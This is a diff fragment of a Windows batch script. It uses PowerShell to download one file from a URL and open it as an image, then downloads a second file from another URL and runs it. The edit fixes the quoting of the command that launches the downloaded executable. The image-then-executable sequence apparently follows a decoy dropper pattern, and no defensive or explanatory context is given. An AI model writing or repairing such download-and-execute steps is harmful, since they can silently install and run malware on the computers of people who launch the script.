@@ -11,6 +11,6 @@ powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%imageU
 start !imageFile!
 
 powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%execURL%', '%execFile%');"
-start /d !execFile!
+start /d "%execFile%"
 
 endlocal
